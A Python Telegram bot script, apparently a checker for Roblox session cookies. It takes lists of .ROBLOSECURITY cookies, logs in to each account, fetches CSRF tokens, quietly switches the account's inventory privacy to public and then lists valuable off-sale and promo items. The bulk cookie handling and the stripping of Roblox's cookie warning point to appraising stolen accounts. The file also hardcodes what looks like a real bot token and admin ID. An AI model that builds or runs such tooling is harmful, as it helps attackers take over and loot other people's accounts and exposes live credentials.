import asyncio
import io
import aiohttp
from datetime import datetime
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    LinkPreviewOptions
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ================================================================
BOT_TOKEN = "8035442503:AAG-gdNAKMFhnyyaHGfjeMdh48-sa-Jd55A"
ADMIN_ID  = 5883796026

YEAR_FROM   = 2012
YEAR_TO     = 2024
CHECK_PROMO = True

ASSET_TYPES = {
    "faces":    True,
    "hats":     True,
    "hair":     True,
    "neck":     True,
    "shoulder": True,
    "front":    True,
    "back":     True,
    "waist":    True,
    "gear":     True,
    "clothing": False,
}
# ================================================================

# v2 API принимает числовые ID типов через запятую
ASSET_TYPE_IDS = {
    "faces":    [18],
    "hats":     [8],
    "hair":     [41],
    "neck":     [42],
    "shoulder": [45],
    "front":    [46],
    "back":     [47],
    "waist":    [43],
    "gear":     [11],
    "clothing": [12, 13],
}

ASSET_LABELS = {
    "faces":    "👤 Лица",
    "hats":     "🎩 Шапки",
    "hair":     "💇 Волосы",
    "neck":     "📿 Шея",
    "shoulder": "🦴 Плечи",
    "front":    "🧣 Передние",
    "back":     "🎒 Задние",
    "waist":    "🩱 Пояс",
    "gear":     "⚔️ Снаряжение",
    "clothing": "👕 Одежда",
}

CODE_ITEMS = {
    189934238:  "Fireman",
    4342314393: "Rainbow Squid Unicorn",
    263405835:  "Chicken Headrow",
    263405839:  "Black Iron Tentacles",
    263405842:  "Code Review Specs",
    263405844:  "Stickpack",
    263405846:  "Shark Fin",
    263405849:  "Federation Necklace",
    263405851:  "Backup Mr. Robot",
    263405853:  "Dark Lord of SQL",
    263405855:  "Roblox visor 1",
    263405857:  "Silver Bow Tie",
    263405859:  "Dodgeball Helmet",
    263405861:  "Shoulder Raccoon",
    263405863:  "Dued1",
    263405865:  "Pauldrons",
    263405867:  "Octember Encore",
    263405869:  "Umberhorns",
    128540404:  "Police Cap",
    128540406:  "American Baseball Cap",
    128540408:  "Orange Cap",
    218491492:  "Navy Queen otn",
    128540410:  "Zombie Knit",
    128540412:  "Epic Miners Headlamp",
    128540414:  "Beast Mode Bandana",
    162295698:  "Golden Reingment",
    128540416:  "Beast Scythe",
    128540418:  "Hare Hoodie",
    128540420:  "Diamond Tiara",
    128540422:  "Callmehbob",
    128540424:  "Sword Cane",
    128540426:  "Selfie Stick",
    128540428:  "Phantom Forces Combat Knife",
    128540430:  "Golden Horns",
    128540432:  "The Soup is Dry",
    128540434:  "Monster Grumpy Face",
    128540436:  "Elegant Evening Face",
    128540438:  "Super Pink Make-Up",
    128540440:  "Cyanskeleface",
    128540442:  "Pizza Face",
    128540444:  "Bakonetta",
    128540446:  "Isabella",
    128540448:  "Mon Cheri",
    128540450:  "Rogueish Good Looks",
    128540452:  "Mixologist's Smile",
    128540454:  "BiteyMcFace",
    128540456:  "Performing Mime",
    128540458:  "Rainbow Spirit Face",
    128540460:  "Mermaid Mystique",
    128540462:  "Starry Eyes Sparkling",
    128540464:  "Sparkling Friendly Wink",
    128540466:  "Kandi's Sprinkle Face",
    128540468:  "Tears of Sorrow",
    128540470:  "Fashion Face",
    128540472:  "Princess Alexis",
    128540474:  "Otakufaic",
    128540476:  "Pop Queen",
    128540478:  "Assassin Face",
    128540480:  "Sapphire Gaze",
    128540482:  "Persephone's E-Girl",
    128540484:  "Arachnid Queen",
    128540486:  "Rainbow Barf Face",
    128540488:  "Star Sorority",
    128540490:  "Tsundere Face",
    128540492:  "Winning Smile",
}

# ================================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp  = Dispatcher(storage=MemoryStorage())

settings = {
    "year_from":   YEAR_FROM,
    "year_to":     YEAR_TO,
    "check_promo": CHECK_PROMO,
    "asset_types": dict(ASSET_TYPES),
}

class SetYear(StatesGroup):
    from_year = State()
    to_year   = State()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"


# ================================================================
#  HELPERS
# ================================================================

def clean_cookie(raw):
    c = raw.strip()
    if "_|WARNING" in c and "--|" in c:
        c = c.split("--|", 1)[-1].strip()
    for p in [".ROBLOSECURITY=", "ROBLOSECURITY="]:
        if c.startswith(p):
            c = c[len(p):]
    return c.strip()


def rbx_h(cookie):
    return {
        "Cookie":          ".ROBLOSECURITY=" + cookie,
        "User-Agent":      UA,
        "Accept":          "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer":         "https://www.roblox.com/",
        "Origin":          "https://www.roblox.com",
    }


def new_s():
    return aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False),
        timeout=aiohttp.ClientTimeout(total=20)
    )


# ================================================================
#  AUTH
# ================================================================

async def get_user_info(cookie):
    async with new_s() as s:
        try:
            async with s.get(
                "https://users.roblox.com/v1/users/authenticated",
                headers=rbx_h(cookie)
            ) as r:
                if r.status == 200:
                    d = await r.json(content_type=None)
                    if d.get("id"):
                        return {"id": int(d["id"]), "name": d.get("displayName") or d.get("name") or "?"}
        except Exception:
            pass
        try:
            async with s.get(
                "https://www.roblox.com/mobileapi/userinfo",
                headers=rbx_h(cookie)
            ) as r:
                if r.status == 200:
                    d = await r.json(content_type=None)
                    if d.get("UserID"):
                        return {"id": int(d["UserID"]), "name": d.get("UserName") or "?"}
        except Exception:
            pass
    return None


# ================================================================
#  INVENTORY — использует v2 API (именно он работал в первый раз)
# ================================================================

async def fetch_inventory_v2(cookie, user_id, type_ids, log):
    """
    inventory.roblox.com/v2/users/{id}/inventory?assetTypes=18,8,...
    Это тот самый эндпоинт что работал изначально.
    """
    ids      = []
    cursor   = ""
    types_str = ",".join(str(t) for t in type_ids)

    async with new_s() as s:
        page = 0
        while True:
            page += 1
            url = "https://inventory.roblox.com/v2/users/{}/inventory".format(user_id)
            params = {"assetTypes": types_str, "limit": 100, "sortOrder": "Asc"}
            if cursor:
                params["cursor"] = cursor
            try:
                async with s.get(url, params=params, headers=rbx_h(cookie)) as r:
                    log("Инвентарь v2 стр.{} типы=[{}]: HTTP {}".format(page, types_str, r.status))
                    if r.status != 200:
                        body = ""
                        try:
                            body = await r.text()
                        except Exception:
                            pass
                        log("  тело: {}".format(body[:120]))
                        break
                    data = await r.json(content_type=None)
                    chunk = []
                    for item in data.get("data", []):
                        aid = item.get("assetId") or item.get("id")
                        if aid:
                            chunk.append(int(aid))
                    ids.extend(chunk)
                    log("  стр.{}: {} предметов".format(page, len(chunk)))
                    cursor = data.get("nextPageCursor") or ""
                    if not cursor:
                        break
            except Exception as e:
                log("  стр.{} ошибка: {}".format(page, str(e)[:80]))
                break
            await asyncio.sleep(0.4)

    return ids


# ================================================================
#  OPEN INVENTORY — правильный эндпоинт
# ================================================================

async def get_csrf(cookie, log):
    async with new_s() as s:
        for url in [
            "https://auth.roblox.com/v2/logout",
            "https://accountsettings.roblox.com/v1/email",
        ]:
            try:
                async with s.post(url, headers=rbx_h(cookie)) as r:
                    token = r.headers.get("x-csrf-token")
                    log("CSRF из {}: HTTP {} token={}".format(
                        url.split("/")[-1], r.status, token[:8] + "..." if token else "None"))
                    if token:
                        return token
            except Exception as e:
                log("CSRF ошибка {}: {}".format(url, str(e)[:60]))
    return None


async def open_inventory(cookie, log):
    csrf = await get_csrf(cookie, log)
    if not csrf:
        return False

    hdrs = dict(rbx_h(cookie))
    hdrs["x-csrf-token"] = csrf
    hdrs["Content-Type"] = "application/json"

    # Правильный URL для privacy настроек (v1 с POST)
    endpoints = [
        ("POST",  "https://accountsettings.roblox.com/v1/inventory-privacy"),
        ("PATCH", "https://accountsettings.roblox.com/v1/inventory-privacy"),
        # Старый эндпоинт который использовали раньше
        ("POST",  "https://www.roblox.com/privacy/settings"),
    ]

    async with new_s() as s:
        for method, url in endpoints:
            try:
                fn = s.post if method == "POST" else s.patch
                async with fn(url, json={"inventoryPrivacy": 1}, headers=hdrs) as r:
                    body = ""
                    try:
                        body = await r.text()
                    except Exception:
                        pass
                    log("{} {} -> HTTP {} | {}".format(method, url.split("/")[-1], r.status, body[:80]))
                    if r.status in (200, 204):
                        return True
            except Exception as e:
                log("{} {} -> ошибка: {}".format(method, url, str(e)[:60]))

    return False


# ================================================================
#  ASSET DETAILS
# ================================================================

async def get_details(cookie, asset_id):
    async with new_s() as s:
        try:
            async with s.get(
                "https://economy.roblox.com/v2/assets/{}/details".format(asset_id),
                headers=rbx_h(cookie)
            ) as r:
                if r.status == 200:
                    return await r.json(content_type=None)
        except Exception:
            pass
    return None


async def check_owns(cookie, user_id, asset_id):
    async with new_s() as s:
        try:
            async with s.get(
                "https://inventory.roblox.com/v1/users/{}/items/Asset/{}".format(user_id, asset_id),
                headers=rbx_h(cookie)
            ) as r:
                if r.status == 200:
                    d = await r.json(content_type=None)
                    return bool(d.get("data"))
        except Exception:
            pass
    return False


# ================================================================
#  ГЛАВНАЯ ПРОВЕРКА
# ================================================================

async def check_account(cookie, status_msg):
    result = {
        "valid": False, "user_id": None, "username": None,
        "offsale": [], "promo_found": [],
        "inv_total": 0, "inv_opened": False, "debug": [],
    }

    def log(msg):
        result["debug"].append(str(msg))

    # 1. Авторизация
    log("Авторизация...")
    user_info = await get_user_info(cookie)
    if not user_info:
        log("Не удалось войти")
        return result

    result["valid"]    = True
    result["user_id"]  = user_info["id"]
    result["username"] = user_info["name"]
    uid   = user_info["id"]
    uname = user_info["name"]
    log("OK: {} (ID {})".format(uname, uid))

    # 2. Открываем инвентарь
    await status_msg.edit_text("✅ <b>{}</b>\n🔓 Открываю инвентарь...".format(uname))
    opened = await open_inventory(cookie, log)
    result["inv_opened"] = opened
    await asyncio.sleep(1.5)

    # 3. Загружаем инвентарь через v2 API
    await status_msg.edit_text("✅ <b>{}</b>\n📦 Загружаю инвентарь...".format(uname))

    # Собираем все включённые type_id в один список
    enabled_type_ids = []
    for key, on in settings["asset_types"].items():
        if on:
            enabled_type_ids.extend(ASSET_TYPE_IDS[key])

    all_ids = set()
    if enabled_type_ids:
        items = await fetch_inventory_v2(cookie, uid, enabled_type_ids, log)
        all_ids.update(items)

    result["inv_total"] = len(all_ids)
    log("Предметов итого: {}".format(len(all_ids)))

    if not all_ids:
        log("Инвентарь пустой или закрытый")
        return result

    # 4. Промо
    if settings["check_promo"]:
        promo_keys = list(CODE_ITEMS.keys())
        total_p    = len(promo_keys)
        await status_msg.edit_text("✅ <b>{}</b>\n🎁 Промо 0/{}...".format(uname, total_p))
        for i, asset_id in enumerate(promo_keys):
            if i % 10 == 0:
                try:
                    await status_msg.edit_text("✅ <b>{}</b>\n🎁 Промо {}/{}...".format(uname, i, total_p))
                except Exception:
                    pass
            if await check_owns(cookie, uid, asset_id):
                result["promo_found"].append({"id": asset_id, "name": CODE_ITEMS[asset_id]})
                log("Промо: {}".format(CODE_ITEMS[asset_id]))
            await asyncio.sleep(0.2)
        log("Промо найдено: {}".format(len(result["promo_found"])))

    # 5. Проверяем каждый предмет на оффсейл
    await status_msg.edit_text("✅ <b>{}</b>\n🔍 Проверяю {} предметов...".format(uname, len(all_ids)))
    ids_list = list(all_ids)
    total    = len(ids_list)

    for i, asset_id in enumerate(ids_list):
        if i % 30 == 0:
            try:
                await status_msg.edit_text("✅ <b>{}</b>\n🔍 {}/{}...".format(uname, i, total))
            except Exception:
                pass

        det = await get_details(cookie, asset_id)
        if not det:
            await asyncio.sleep(0.1)
            continue

        # IsForSale=False → нельзя купить → оффсейл
        if det.get("IsForSale", True):
            await asyncio.sleep(0.1)
            continue

        year = 0
        try:
            created = det.get("Created", "")
            if created:
                dt   = datetime.fromisoformat(created.replace("Z", "+00:00"))
                year = dt.year
        except Exception:
            pass

        if year and not (settings["year_from"] <= year <= settings["year_to"]):
            await asyncio.sleep(0.1)
            continue

        is_unique  = det.get("IsLimitedUnique", False)
        is_limited = det.get("IsLimited", False) or is_unique
        name       = det.get("Name") or "ID:{}".format(asset_id)

        result["offsale"].append({
            "id": asset_id, "name": name,
            "year": year, "limited": is_limited, "unique": is_unique,
        })
        log("Оффсейл: {} ({})".format(name, year))
        await asyncio.sleep(0.1)

    log("Оффсейл итого: {}".format(len(result["offsale"])))
    return result


# ================================================================
#  ОТЧЁТ
# ================================================================

def build_report(result):
    uid, uname = result["user_id"], result["username"]
    offsale    = result["offsale"]
    promo      = result["promo_found"]
    lines = [
        "📋 <b>Отчёт проверки</b>",
        '👤 <a href="https://www.roblox.com/users/{}/profile">{}</a>  (ID: {})'.format(uid, uname, uid),
        "📅 Период: <b>{} – {}</b>".format(settings["year_from"], settings["year_to"]),
        "📦 Предметов: <b>{}</b>  {}".format(
            result.get("inv_total", 0),
            "✅" if result["inv_opened"] else "⚠️ инвентарь не открылся"
        ),
        "",
    ]
    if offsale:
        lines.append("🛑 <b>Оффсейл — {} шт.:</b>".format(len(offsale)))
        by_year = {}
        for it in sorted(offsale, key=lambda x: x["year"] or 9999):
            by_year.setdefault(it["year"] or 0, []).append(it)
        for year in sorted(by_year):
            lines.append("\n  📆 <b>{}:</b>".format(year or "Год неизвестен"))
            for it in by_year[year]:
                badge = " 🔴LimitedU" if it["unique"] else (" 🟡Limited" if it["limited"] else "")
                lines.append('    • <a href="https://www.roblox.com/catalog/{}">{}</a>{}'.format(
                    it["id"], it["name"], badge))
    else:
        lines.append("🛑 Оффсейл предметов <b>не найдено</b>")
    lines.append("")
    if settings["check_promo"]:
        if promo:
            lines.append("🎁 <b>Промо — {} шт.:</b>".format(len(promo)))
            for it in promo:
                lines.append('    • <a href="https://www.roblox.com/catalog/{}">{}</a>'.format(
                    it["id"], it["name"]))
        else:
            lines.append("🎁 Промо-предметов <b>не найдено</b>")
    return "\n".join(lines)


async def run_check(message, cookie, show_debug=False):
    cookie = clean_cookie(cookie)
    if len(cookie) < 50:
        await message.answer("❌ Cookie слишком короткий ({} символов).".format(len(cookie)))
        return
    status_msg = await message.answer("⏳ <b>Авторизация...</b>")
    try:
        result = await check_account(cookie, status_msg)
    except Exception as e:
        await status_msg.edit_text("❌ Ошибка:\n<code>{}</code>".format(e))
        return
    if not result["valid"]:
        errs = "\n".join(result["debug"])
        await status_msg.edit_text("❌ <b>Невалидный cookie</b>\n\n<code>{}</code>".format(errs))
        return
    report = build_report(result)
    if len(report) > 3800:
        await status_msg.delete()
        buf = io.BytesIO(report.encode("utf-8"))
        buf.name = "report_{}.txt".format(result["user_id"])
        await message.answer_document(buf, caption="📋 {}".format(result["username"]))
    else:
        await status_msg.edit_text(report, link_preview_options=LinkPreviewOptions(is_disabled=True))
    if show_debug or result["inv_total"] == 0:
        dbg = "🛠 <b>Лог:</b>\n" + "\n".join("<code>{}</code>".format(l) for l in result["debug"])
        if len(dbg) < 3800:
            await message.answer(dbg)


# ================================================================
#  КЛАВИАТУРА
# ================================================================

def settings_kb():
    rows = []
    for key, label in ASSET_LABELS.items():
        icon = "✅" if settings["asset_types"][key] else "❌"
        rows.append([InlineKeyboardButton(text="{} {}".format(icon, label), callback_data="tog_{}".format(key))])
    pi = "✅" if settings["check_promo"] else "❌"
    rows.append([InlineKeyboardButton(text="{} 🎁 Промо".format(pi), callback_data="tog_promo")])
    rows.append([
        InlineKeyboardButton(text="📅 С {}".format(settings["year_from"]), callback_data="set_yf"),
        InlineKeyboardButton(text="📅 По {}".format(settings["year_to"]),  callback_data="set_yt"),
    ])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def is_admin(obj):
    return obj.from_user.id == ADMIN_ID


# ================================================================
#  ХЕНДЛЕРЫ
# ================================================================

@dp.message(CommandStart())
async def cmd_start(message: Message):
    if not is_admin(message): return
    await message.answer(
        "🎮 <b>Roblox Offsale Checker</b>\n\n"
        "Отправь cookie текстом или .txt файлом\n\n"
        "⚙️ /settings  ℹ️ /info  🛠 /debug [cookie]"
    )

@dp.message(Command("info"))
async def cmd_info(message: Message):
    if not is_admin(message): return
    types_on = [ASSET_LABELS[k] for k, v in settings["asset_types"].items() if v]
    await message.answer(
        "ℹ️ <b>Настройки</b>\n📅 {}-{}\n🎁 Промо: {}\n📦 {}".format(
            settings["year_from"], settings["year_to"],
            "✅" if settings["check_promo"] else "❌",
            ", ".join(types_on)
        )
    )

@dp.message(Command("settings"))
async def cmd_settings(message: Message):
    if not is_admin(message): return
    await message.answer("⚙️ <b>Настройки</b>", reply_markup=settings_kb())

@dp.message(Command("debug"))
async def cmd_debug(message: Message):
    if not is_admin(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("Использование: /debug [cookie]")
        return
    await run_check(message, parts[1].strip(), show_debug=True)

@dp.callback_query(F.data.startswith("tog_"))
async def cb_toggle(cb: CallbackQuery):
    if not is_admin(cb): return await cb.answer("⛔")
    key = cb.data.replace("tog_", "")
    if key == "promo":
        settings["check_promo"] = not settings["check_promo"]
    elif key in settings["asset_types"]:
        settings["asset_types"][key] = not settings["asset_types"][key]
    await cb.message.edit_reply_markup(reply_markup=settings_kb())
    await cb.answer("✅")

@dp.callback_query(F.data == "set_yf")
async def cb_yf(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb): return await cb.answer("⛔")
    await cb.message.answer("📅 Начальный год (сейчас {}):".format(settings["year_from"]))
    await state.set_state(SetYear.from_year)
    await cb.answer()

@dp.callback_query(F.data == "set_yt")
async def cb_yt(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb): return await cb.answer("⛔")
    await cb.message.answer("📅 Конечный год (сейчас {}):".format(settings["year_to"]))
    await state.set_state(SetYear.to_year)
    await cb.answer()

@dp.message(SetYear.from_year)
async def save_yf(message: Message, state: FSMContext):
    try:
        y = int(message.text.strip())
        assert 2006 <= y <= 2030
        settings["year_from"] = y
        await message.answer("✅ Начальный год: <b>{}</b>".format(y))
        await state.clear()
    except (ValueError, AssertionError):
        await message.answer("❌ Введи число 2006–2030")

@dp.message(SetYear.to_year)
async def save_yt(message: Message, state: FSMContext):
    try:
        y = int(message.text.strip())
        assert 2006 <= y <= 2030
        settings["year_to"] = y
        await message.answer("✅ Конечный год: <b>{}</b>".format(y))
        await state.clear()
    except (ValueError, AssertionError):
        await message.answer("❌ Введи число 2006–2030")

@dp.message(F.document)
async def handle_file(message: Message):
    if not is_admin(message): return
    doc = message.document
    if not doc.file_name.endswith(".txt"):
        await message.answer("❌ Нужен .txt файл")
        return
    file = await bot.get_file(doc.file_id)
    buf  = io.BytesIO()
    await bot.download_file(file.file_path, destination=buf)
    buf.seek(0)
    lines   = buf.read().decode("utf-8", errors="ignore").splitlines()
    cookies = [l.strip() for l in lines if len(l.strip()) > 50]
    if not cookies:
        await message.answer("❌ Не нашёл cookie в файле")
        return
    await message.answer("📂 <b>{}</b> cookie. Начинаю...".format(len(cookies)))
    for i, c in enumerate(cookies, 1):
        hdr = await message.answer("🔄 {}/{}".format(i, len(cookies)))
        await run_check(message, c)
        try: await hdr.delete()
        except Exception: pass
        await asyncio.sleep(1)
    await message.answer("✅ Готово! {} аккаунтов.".format(len(cookies)))

@dp.message(F.text)
async def handle_text(message: Message, state: FSMContext):
    if not is_admin(message): return
    if await state.get_state(): return
    lines = [l.strip() for l in message.text.splitlines() if len(l.strip()) > 50]
    if not lines:
        await message.answer("ℹ️ Отправь cookie или .txt файл\n/settings")
        return
    if len(lines) == 1:
        await run_check(message, lines[0])
    else:
        await message.answer("📋 <b>{}</b> cookie. Начинаю...".format(len(lines)))
        for i, c in enumerate(lines, 1):
            hdr = await message.answer("🔄 {}/{}".format(i, len(lines)))
            await run_check(message, c)
            try: await hdr.delete()
            except Exception: pass
            await asyncio.sleep(1)
        await message.answer("✅ Готово! {} аккаунтов.".format(len(lines)))

# ================================================================
async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
